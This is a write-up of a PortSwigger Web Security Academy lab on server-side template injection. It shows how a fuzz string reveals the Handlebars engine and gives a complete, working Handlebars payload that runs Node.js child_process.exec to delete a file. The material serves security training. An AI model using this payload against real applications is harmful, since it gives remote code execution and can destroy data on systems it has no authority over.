#  Server-side template injection in an unknown language with a documented exploit

## 📌 Lab Details
- **Title**: Server-side template injection in an unknown language with a documented exploit
- **Difficulty**: Practitioner
- **Category**: Server Side Template Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/546e06146b126617be92ff441630f1cd8cc05bf0a17ed763ca936166fd17d95b?referrer=%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

## 🔍 Summary
This lab contains a Server-Side Template Injection (SSTI) vulnerability in an unknown template engine. The objective is to identify the template engine being used and leverage a publicly documented exploit to achieve Remote Code Execution (RCE).
By fuzzing the application with template syntax from multiple template engines, an error message revealed that the application was using Handlebars. After identifying the engine, a known SSTI exploit was adapted to execute arbitrary Node.js code and delete the target file.

## 🛠 Steps to Solve
1. The `GET` request with the `message` parameter is the **vulnerable endpoint**.
2. Experiment by injecting a fuzz string containing template syntax from various different template languages, such as `${{<%[%'"}}%\`, into the `message` parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.
3. Search the web for "Handlebars server-side template injection".
4. Modify this exploit so that it calls `require("child_process").exec("rm /home/carlos/morale.txt")` as follows:
   ```sh
   wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
   {{/with}}
   ```
5. URL encode your exploit and add it as the value of the message parameter in the URL.
6. Load the URL to solve the lab.
   

## 📖 Key Takeaways
- SSTI vulnerabilities can lead directly to Remote Code Execution.
- When the template engine is unknown, fuzzing with multiple template syntaxes can help identify it.
- Error messages often reveal the underlying template technology.
- Handlebars is commonly considered safer than many template engines, but insecure server-side usage can still result in RCE.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bad1ac6d-1093-4ee0-89fc-e9a955c86038" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/64d820b2-e925-45a1-b78c-1f14f6487e40" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b9cd0d53-72cd-41a9-b951-5fcbc6c6aa6b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1d8ed25a-7e0f-4d92-a3b7-fc421849082e" />
